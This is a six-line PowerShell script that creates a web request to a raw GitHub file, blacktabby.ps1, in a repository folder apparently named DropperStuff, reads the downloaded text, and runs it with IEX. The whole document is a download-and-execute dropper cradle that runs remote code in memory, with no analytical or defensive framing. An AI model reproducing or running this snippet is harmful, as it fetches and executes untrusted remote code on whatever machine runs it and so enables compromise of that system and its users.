$webreq = [System.Net.WebRequest]::Create(‘https://raw.githubusercontent.com/latortuga71/Black_Tabby/master/DropperStuff/blacktabby.ps1’)
$resp=$webreq.GetResponse()
$respstream=$resp.GetResponseStream()
$reader=[System.IO.StreamReader]::new($respstream)
$content=$reader.ReadToEnd()
IEX($content)
